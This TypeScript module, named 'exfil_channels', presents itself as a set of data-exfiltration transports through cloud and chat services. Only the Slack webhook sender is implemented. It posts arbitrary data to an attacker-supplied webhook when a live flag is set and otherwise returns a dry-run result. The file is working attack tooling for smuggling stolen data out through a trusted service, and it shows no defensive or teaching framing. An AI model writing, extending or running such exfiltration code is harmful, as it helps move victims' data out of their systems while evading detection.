/**
 * @module exfil_channels
 * Transports for Exfiltration — AWS S3 Bucket Dropper, Slack Webhooks, Discord Webhooks,
 * GitHub Gist Drops, Pastebin, and Google Drive API.
 */

export interface TransportResult {
  channel: string;
  status: "success" | "dry_run" | "error";
  url?: string;
  bytesTransferred: number;
}

export async function sendSlackWebhook(data: string, webhookUrl: string, live = false): Promise<TransportResult> {
  if (!live) {
    return { channel: "Slack", status: "dry_run", bytesTransferred: data.length };
  }

  try {
    const res = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text: `\`\`\`${data}\`\`\`` }),
    });
    return { channel: "Slack", status: res.ok ? "success" : "error", bytesTransferred: data.length };
  } catch {
    return { channel: "Slack", status: "error", bytesTransferred: 0 };
  }
}

export default { sendSlackWebhook };
